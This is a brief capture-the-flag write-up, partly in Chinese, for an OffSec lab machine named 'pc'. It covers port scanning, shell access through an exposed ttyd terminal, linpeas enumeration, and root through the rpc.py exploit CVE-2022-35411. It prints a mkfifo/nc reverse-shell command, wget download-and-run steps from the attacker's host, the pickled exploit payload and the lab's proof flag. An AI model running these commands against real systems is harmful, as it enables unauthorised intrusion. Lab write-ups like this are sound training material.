###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# pc
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.182.210 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.182.210:22
Open 192.168.182.210:8000

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt syn-ack ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 173
|     <html><head><meta charset=utf-8 http-equiv="Content-Language" content="en"/><link rel="stylesheet" type="text/css" href="/error.css"/>
```

他8000port直接可以有個terminal
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

user@pc:/home/user$ wget 192.168.45.229/shell_9001
user@pc:/home/user$ chmod +x shell_9001
user@pc:/home/user$ ./shell_9001
```

使用linpeas，在`/opt`裡面可以找到`rpc.py`
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

user@pc:/tmp$ wget 192.168.45.229/linpeas.sh
user@pc:/tmp$ chmod +x linpeas.sh
user@pc:/tmp$ ./linpeas.sh

...
╔══════════╣ Unexpected in /opt (usually empty)
total 16                                                                                                                                    
drwxr-xr-x  3 root root 4096 Aug 25  2023 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..
drwx--x--x  4 root root 4096 Jun 28  2023 containerd
-rw-r--r--  1 root root  625 Aug 25  2023 rpc.py
...
```

google找到`rpcpy-exploit`[CVE-2022-35411](https://github.com/ehtec/rpcpy-exploit/tree/main)，把裡面`exec_command`改reverse command，執行
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9002

exec_command('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.229 9002 >/tmp/f')

user@pc:/home/user$ wget 192.168.45.229/rpcpy-exploit.py
user@pc:/home/user$ python3 rpcpy-exploit.py
python3 rpcpy-exploit.py
b'\x80\x04\x95l\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8cQrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.229 9002 >/tmp/f\x94\x85\x94R\x94.'

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@pc:/root# cat proof.txt
3cd3e97c51f00357835a76b8c222c95f
```